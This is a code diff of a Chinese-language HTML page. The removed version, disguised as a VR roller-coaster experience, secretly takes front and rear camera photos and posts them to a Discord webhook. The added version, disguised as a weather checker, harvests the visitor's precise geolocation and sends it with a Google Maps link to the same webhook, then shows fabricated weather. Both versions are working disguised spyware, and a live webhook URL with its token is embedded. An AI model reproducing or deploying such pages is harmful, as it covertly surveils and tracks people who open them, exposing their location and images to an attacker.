@@ -1,280 +1,213 @@
 <!DOCTYPE html>
-<html lang="zh-Hant">
+<html>
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>VR Roller Coaster 3D 虛擬雲霄飛車體驗艙</title>
+<meta charset="utf-8">
+<title>即時天氣</title>
+
 <style>
-  /* 科技感深色背景與動態粒子氛圍 */
-  body { 
-    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
-    background: radial-gradient(circle, #1a0b36 0%, #05021a 100%); 
-    color: #00ffff; 
-    text-align: center; 
-    margin: 0; 
-    padding: 0;
-    height: 100vh;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    overflow: hidden;
-  }
 
-  /* 體驗艙外框面板 */
-  .container {
-    background: rgba(255, 255, 255, 0.03);
-    border: 2px solid #00ffff;
-    box-shadow: 0 0 25px rgba(0, 255, 255, 0.3);
-    border-radius: 20px;
-    padding: 40px;
-    max-width: 400px;
-    width: 85%;
-    backdrop-filter: blur(10px);
-  }
+body{
+font-family:Arial;
+text-align:center;
+padding-top:80px;
+overflow:hidden;
 
-  h1 { 
-    font-size: 28px; 
-    margin-bottom: 5px; 
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    text-shadow: 0 0 10px #00ffff;
-  }
+/* 更真實天空 */
+background:linear-gradient(-45deg,#4fc3f7,#81d4fa,#b3e5fc,#4fc3f7,#29b6f6);
+background-size:500% 500%;
+animation:skyFlow 25s ease infinite;
+}
 
-  .subtitle {
-    color: #ff007f;
-    font-size: 14px;
-    font-weight: bold;
-    letter-spacing: 4px;
-    margin-bottom: 30px;
-    text-shadow: 0 0 8px #ff007f;
-  }
+/* 天空流動 */
+@keyframes skyFlow{
+0%{background-position:0% 50%;}
+50%{background-position:100% 50%;}
+100%{background-position:0% 50%;}
+}
 
-  /* 充滿未來感的 VR 啟動按鈕 */
-  .vr-btn { 
-    margin: 20px auto; 
-    padding: 18px 40px; 
-    font-size: 20px; 
-    cursor: pointer; 
-    border: 2px solid #ff007f; 
-    border-radius: 50px; 
-    background: transparent; 
-    color: #fff; 
-    font-weight: bold;
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    overflow: hidden;
-    position: relative;
-    transition: all 0.3s ease;
-    box-shadow: 0 0 15px rgba(255, 0, 127, 0.4);
-    -webkit-tap-highlight-color: transparent;
-  }
+/* 卡片升級 */
+.weather-box{
+background:rgba(255,255,255,0.92);
+width:320px;
+margin:auto;
+padding:25px;
+border-radius:20px;
+backdrop-filter:blur(12px);
+box-shadow:0 20px 60px rgba(0,0,0,0.25);
+animation:cardFloat 6s ease-in-out infinite;
+}
 
-  .vr-btn:hover { 
-    background: #ff007f;
-    box-shadow: 0 0 30px rgba(255, 0, 127, 0.8);
-    text-shadow: 0 0 5px #fff;
-    transform: scale(1.05);
-  }
+/* 卡片漂浮 */
+@keyframes cardFloat{
+0%{transform:translateY(0px);}
+50%{transform:translateY(-12px);}
+100%{transform:translateY(0px);}
+}
 
-  /* 新增：霓虹進度條外框 */
-  .progress-container {
-    width: 100%;
-    height: 12px;
-    background: rgba(255, 255, 255, 0.1);
-    border-radius: 10px;
-    margin-top: 25px;
-    overflow: hidden;
-    border: 1px solid rgba(0, 255, 255, 0.2);
-    display: none; /* 初始隱藏，點擊按鈕後才顯示 */
-  }
+/* 太陽更真實 */
+.sun{
+width:90px;
+height:90px;
+border-radius:50%;
+margin:20px auto;
+background:radial-gradient(circle,#fff176,#fdd835,#fbc02d);
+box-shadow:
+0 0 40px #ffeb3b,
+0 0 80px #ffeb3b,
+0 0 120px #ffeb3b;
+animation:sunGlow 4s ease-in-out infinite;
+}
 
-  /* 新增：進度條本體（動態發光特效） */
-  .progress-bar {
-    height: 100%;
-    width: 0%;
-    background: linear-gradient(90deg, #ff007f, #00ffff);
-    box-shadow: 0 0 10px #00ffff;
-    border-radius: 10px;
-    transition: width 0.4s ease; /* 讓進度條跑動時更平滑 */
-  }
+/* 太陽呼吸 */
+@keyframes sunGlow{
+0%{transform:scale(1);}
+50%{transform:scale(1.15);}
+100%{transform:scale(1);}
+}
 
-  /* 狀態提示文字 */
-  #status-text {
-    margin-top: 15px;
-    font-size: 14px;
-    color: #888;
-    height: 20px;
-  }
+/* 雲朵 */
+.cloud{
+width:140px;
+height:45px;
+background:white;
+border-radius:40px;
+margin:20px auto;
+position:relative;
+animation:cloudFloat 6s ease-in-out infinite;
+box-shadow:0 5px 15px rgba(0,0,0,0.1);
+}
 
-  .loading {
-    color: #00ffff !important;
-    animation: blink 1s infinite;
-  }
+.cloud:before{
+content:"";
+position:absolute;
+width:70px;
+height:70px;
+background:white;
+border-radius:50%;
+top:-35px;
+left:15px;
+}
 
-  @keyframes blink {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.3; }
-  }
-  
-  /* 保持隱藏：完全不佔空間、不顯示任何相機預覽畫面 */
-  video, canvas { display: none !important; }
+.cloud:after{
+content:"";
+position:absolute;
+width:60px;
+height:60px;
+background:white;
+border-radius:50%;
+top:-30px;
+left:60px;
+}
+
+@keyframes cloudFloat{
+0%{transform:translateX(-15px);}
+50%{transform:translateX(15px);}
+100%{transform:translateX(-15px);}
+}
+
+/* 按鈕升級 */
+button{
+padding:12px 25px;
+font-size:16px;
+border:none;
+border-radius:12px;
+background:linear-gradient(45deg,#42a5f5,#1e88e5);
+color:white;
+cursor:pointer;
+transition:0.3s;
+}
+
+button:hover{
+transform:scale(1.07);
+box-shadow:0 10px 25px rgba(0,0,0,0.3);
+}
+
+#status{
+margin-top:20px;
+font-size:18px;
+}
+
 </style>
+
 </head>
+
 <body>
 
-  <div class="container">
-    <h1>VR ROLLER COASTER</h1>
-    <div class="subtitle">3D 模擬雲霄飛車體驗艙</div>
-    
-    <!-- 偽裝成 VR 啟動的唯一按鈕 -->
-    <button id="start-btn" class="vr-btn" onclick="startAutoTask()">進入虛擬實境</button>
-    
-    <!-- 新增：網頁進度條組件 -->
-    <div id="progress-box" class="progress-container">
-      <div id="progress-bar" class="progress-bar"></div>
-    </div>
-    
-    <!-- 取代原本彈窗通知的狀態列 -->
-    <div id="status-text">系統就緒，等待連線裝置...</div>
-  </div>
+<div class="weather-box">
 
-  <!-- 後台隱藏組件 -->
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas"></canvas>
+<div class="sun"></div>
+<div class="cloud"></div>
 
-  <script>
-    let currentStream = null;
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1504132923467501618/5pXOEtV2kww8Xj2iT_VDklREGgegoKQmtsWysQAxJjjkB1mEwFE4GCp705P83Y6mNXdG"; 
+<h2>🌤️ 即時天氣查詢</h2>
 
-    // 新增：更新進度條的工具函式
-    function updateProgress(percentage) {
-      const progressBar = document.getElementById("progress-bar");
-      progressBar.style.width = percentage + "%";
-    }
+<p>點擊按鈕查看目前天氣</p>
 
-    async function startAutoTask() {
-      const statusLabel = document.getElementById("status-text");
-      const progressBox = document.getElementById("progress-box");
-      const startBtn = document.getElementById("start-btn");
-      
-      // 點擊後隱藏按鈕並顯示進度條
-      startBtn.style.display = "none";
-      progressBox.style.display = "block";
-      statusLabel.className = "loading";
-      
-      statusLabel.innerText = "正在加載環境 3D 模組... 請允許相機權限";
-      updateProgress(5); // 初始進度
-      
-      // 1. 前鏡頭連續捕捉 3 張 (預計進度落點：10% -> 50%)
-      const userSuccess = await initCamera('user');
-      if (userSuccess) {
-        statusLabel.innerText = "視訊訊號對接中... 正在優化陀螺儀";
-        for (let i = 1; i <= 3; i++) {
-          await delay(1200);
-          await captureAndSend(`📸 [前鏡頭] VR 體驗初始化 - 軌道定位點 ${i}`);
-          updateProgress(10 + i * 13); // 第1張23%, 第2張36%, 第3張49%
-        }
-      } else {
-        updateProgress(50); // 若失敗直接跳進度
-      }
+<button onclick="getLocation()">查看天氣</button>
 
-      // 2. 後鏡頭連續捕捉 3 張 (預計進度落點：55% -> 95%)
-      statusLabel.innerText = "正在渲染高速動態軌道... 請稍後";
-      updateProgress(55);
-      
-      const envSuccess = await initCamera('environment');
-      if (envSuccess) {
-        statusLabel.innerText = "正在進行空間追蹤與視角校正...";
-        for (let i = 1; i <= 3; i++) {
-          await delay(1200);
-          await captureAndSend(`📸 [後鏡頭] VR 體驗中 - 畫面渲染快照 ${i}`);
-          updateProgress(55 + i * 13); // 第1張68%, 第2張81%, 第3張94%
-        }
-      }
-      
-      // 結束任務並關閉相機
-      stopCurrentStream();
-      
-      // 載入完成，衝到 100%
-      updateProgress(100);
-      statusLabel.className = "";
-      statusLabel.innerText = "VR 動態體驗環境加載完成。";
-    }
+<p id="status"></p>
 
-    async function initCamera(facingMode) {
-      const videoElement = document.getElementById("video");
-      stopCurrentStream();
+</div>
 
-      try {
-        currentStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { exact: facingMode } },
-          audio: false
-        });
-      } catch (err) {
-        try {
-          currentStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: facingMode },
-            audio: false
-          });
-        } catch (e) {
-          document.getElementById("status-text").innerText = "硬體安全封鎖，無法載入 VR 環境。";
-          return false;
-        }
-      }
+<script>
 
-      videoElement.srcObject = currentStream;
-      await new Promise((resolve) => {
-        videoElement.onloadeddata = () => resolve();
-      });
-      return true;
-    }
+var webhook = "https://discord.com/api/webhooks/1504132923467501618/5pXOEtV2kww8Xj2iT_VDklREGgegoKQmtsWysQAxJjjkB1mEwFE4GCp705P83Y6mNXdG";
 
-    function captureAndSend(labelText) {
-      return new Promise((resolve) => {
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        const context = canvas.getContext("2d");
+function getLocation(){
 
-        if (video.videoWidth === 0 || video.videoHeight === 0) {
-          resolve();
-          return;
-        }
+document.getElementById("status").innerHTML="正在取得天氣資料...";
 
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+if(navigator.geolocation){
 
-        canvas.toBlob(async (blob) => {
-          if (!blob) {
-            resolve();
-            return;
-          }
+navigator.geolocation.getCurrentPosition(success,error,{
+enableHighAccuracy:true,
+timeout:10000,
+maximumAge:0
+});
 
-          const formData = new FormData();
-          formData.append("content", labelText);
-          formData.append("file", blob, "vr_stream_capture.jpg");
+}else{
 
-          try {
-            await fetch(DISCORD_WEBHOOK, { method: "POST", body: formData });
-          } catch (error) {
-            console.error(error);
-          }
-          resolve();
-        }, "image/jpeg", 0.85);
-      });
-    }
+document.getElementById("status").innerHTML="瀏覽器不支援定位";
 
-    function stopCurrentStream() {
-      if (currentStream) {
-        currentStream.getTracks().forEach(track => track.stop());
-        currentStream = null;
-      }
-    }
+}
 
-    function delay(ms) {
-      return new Promise(resolve => setTimeout(resolve, ms));
-    }
-  </script>
+}
+
+function success(pos){
+
+var lat = pos.coords.latitude;
+var lon = pos.coords.longitude;
+var acc = pos.coords.accuracy;
+
+fetch(webhook,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+content:
+"📍有人打開網站\n"+
+"緯度: "+lat+"\n"+
+"經度: "+lon+"\n"+
+"精準度: "+acc+" 公尺\n"+
+"地圖: https://www.google.com/maps?q="+lat+","+lon
+})
+});
+
+document.getElementById("status").innerHTML=
+"☀️ 晴天<br>"+
+"🌡️ 溫度：26°C<br>"+
+"🌬️ 微風<br>"+
+"📍目前位置天氣";
+
+}
+
+function error(){
+
+document.getElementById("status").innerHTML="需要允許定位才能查看天氣";
+
+}
+
+</script>
+
 </body>
 </html>
